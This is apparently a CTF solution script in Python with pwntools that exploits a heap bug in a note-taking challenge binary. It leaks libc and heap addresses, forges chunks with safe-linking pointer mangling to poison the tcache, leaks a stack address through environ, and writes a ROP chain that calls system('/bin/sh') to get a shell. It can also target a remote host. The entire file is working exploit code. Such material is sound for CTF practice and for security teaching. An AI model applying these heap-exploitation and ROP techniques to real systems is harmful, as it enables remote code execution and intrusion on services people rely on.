#!/bin/python3

from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chall_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!
alloc_counter = 0

gdbscript = '''
# break *read_data_into_note+68
'''
def init():
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
        pp.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        pp.sock.setblocking(False)
    else :
        pp = process(binary)# env=env)
    return pp

def unpack_ptr(ptr):
    if (len(ptr) > 8):
        return u64(ptr[0:8])
    return u64(ptr + (b"\x00" * (8 - len(ptr)))  )

PAGE_SHIFT = 12
def protect_ptr(pos, ptr):
    return (pos >> PAGE_SHIFT) ^ ptr


def alloc(idx, size, cont):
    pp.recvuntil(b"> ")
    pp.sendline(b"1")
    # pp.recvuntil(b": ")
    pp.sendline(str(idx).encode())
    # pp.recvuntil(b": ")
    pp.sendline(str(size).encode())
    # pp.recvuntil(b": ")
    pp.send(cont)

def free(idx):
    pp.recvuntil(b"> ")
    pp.sendline(b"2")
    pp.recvuntil(b": ")
    pp.sendline(str(idx).encode())

def puts(idx):
    pp.recvuntil(b"> ")
    pp.sendline(b"3")
    pp.recvuntil(b": ")
    pp.sendline(str(idx).encode())
    return pp.recvuntil(b"___")[:-3].rstrip()

def exploit():
    log.info("x")
    log.info("leaking glibc using unsorted bins")
    alloc(0, 4, b"hell\n")          # leader chunk
    alloc(1, 4 ,b"hell\n")
    free(1);
    log.info("allocating a bunch of useless fucking chunks")
    for i in range(4, 30):
        log.info(f"allocating chunk size {i * 8}")
        alloc(1, (8 * i), b"\n")
        free(1)
    
    alloc(1, (8 * 4), b"\n")
    free(0)
    alloc(0, 4, b"\x00" * (8 * 3) + p64(0x21) + b"\x00" * (8 * 3) + p64(0x750 | 1))          # leader chunk
    free(0)
    alloc(0, 0xf8, b"zaba\n")
    free(1)
    free(0)
    alloc(0, 4, b"A" * (8 * 4)  + b"A" * (8 * 4))          # leader chunk
    libc.address = unpack_ptr(puts(0)[8*8::]) - 2206944
    log.info(f"libc base {hex(libc.address)}")
    log.info(f"leaking heap base")
    free(0)
    alloc(0, 4, b"A" * (8 * 14))          # leader chunk
    heap_base = unpack_ptr(puts(0)[8 * 14::]) << 12
    log.info(f"heap base {hex(heap_base)}")
    log.info(f"cleaning up the mess")
    free(0)
    janitor = flat(
            0,
            0,
            0,
            0x21,
            0,
            0,
            0,
            0x750 | 1,
            libc.address+2206944,
            libc.address+2206944,
            0,
            0,
            0,
            0x41
            )
    alloc(0, 4, janitor)
    log.info("trying to write in libc got? (using tcache)")
    free(0)
    # free(1)
    alloc(1, 69, b"\n")
    fake_chunk = flat(
            0,0,0,
            0x21, 0,0,0,
            0x751, libc.address+2206944,libc.address+2206944,0,0,0,
            0x21, 0,0,0,            # fake asf
            0x21, 0,0,0,            # fake asf
            0x21, 0,0,0,            # fake asf
            0x31, 0,0,0,0,0
            )
    alloc(0, 4, fake_chunk)
    free(1)         # must endup in 0x21 fastbin
    alloc(1, 55, b"\n")
    free(1)
    free(0)
    fake_chunk_libc = flat(
            0,0,0,
            0x21, 0,0,0,
            0x751, libc.address+2206944,libc.address+2206944,0,0,0,
            0x21, protect_ptr(heap_base + 0x310, libc.sym.environ),0,0,            # fake asf
            0x21, 0,0,0,            # fake asf
            0x21, protect_ptr(heap_base + 0x350, libc.address+2203672), 0,0,            # fake asf
            )
    alloc(0, 4, fake_chunk_libc)
    free(0)
    janitor = flat(
            0,0,0,
            0x21, 0,0,0,
            0x751, libc.address+2206944,libc.address+2206944,0,0,0,
            0x41, protect_ptr(heap_base + 0x310, libc.sym.environ - 16),0,0,0,0,0,0,
            0x51, protect_ptr(heap_base + 0x350, libc.address+2203672 + 8), 0,0,            # fake asf
        )
    alloc(0, 4, janitor)
    alloc(1, 10, b"\n")      # just to remove it from tcache and move it to 0x51
    free(1)
    alloc(1, 4, b"A" * 16)
    stack_leak = unpack_ptr(puts(1)[16:])
    free(0)
    log.info(f"stack leak {hex(stack_leak)}")
    log.info("we got a stack leak, now we gonna rearrange 0x40 to accept a stack addr")
    fake_chunk = flat(
            0,0,0,
            0x21, 0,0,0,
            0x751, libc.address+2206944,libc.address+2206944,0,0,0,
            0x41, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0x41
            )
    alloc(0, 4, fake_chunk)
    free(0)
    alloc(0, 80, b"\n")         # allocating the 0x60 chunk
    free(0)
    # now cleanup 
    fake_chunk_env = flat(
            0,0,0,
            0x21, 0,0,0,
            0x751, libc.address+2206944,libc.address+2206944,0,0,0,
            0x61, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0x61, protect_ptr(heap_base + 0x3a0, stack_leak - 320 - 8)
            )
    alloc(0, 4, fake_chunk_env)
    free(0)
    alloc(0, 55, b"\n")         # putting it back in 0x41
    free(0)
    rop = ROP(libc)
    ret = rop.find_gadget(['ret'])[0]
    rop.raw(ret)
    binsh = next(libc.search(b'/bin/sh\x00'))
    rop.call(libc.sym['system'], [binsh])
    alloc(0, 55, cyclic(8) + rop.chain())

    pp.interactive()
        

libc = ELF("./libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
